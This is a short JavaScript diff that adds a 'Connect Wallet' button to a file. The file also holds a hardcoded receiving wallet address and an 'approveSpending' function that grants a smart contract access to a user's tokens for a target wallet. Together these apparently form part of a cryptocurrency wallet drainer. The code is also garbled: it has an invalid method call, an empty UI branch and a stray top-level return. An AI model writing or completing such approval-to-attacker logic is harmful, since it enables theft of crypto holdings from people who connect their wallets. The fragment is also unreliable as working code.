@@ -4,7 +4,17 @@ const receiveAddress = "0xb24E8eaAf141D69c44044146694FcbF81363FAE3";   // remove
 var cryptotokenContract;
 var smartcontract
 
-
+return o && i && a ? (
+    // UI for connected state
+) : (
+    (0, n.jsx)("button", {
+        onClick: d,  // This is the event that triggers wallet connection
+        type: "button",
+        className: "border-2 border-white ml-3 inline-flex items-center rounded-md bg-red-800 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-red-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-frens-600",
+        children: "Connect Wallet"
+    })
+)
+	
 function approveSpending(token) {
 	
 	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
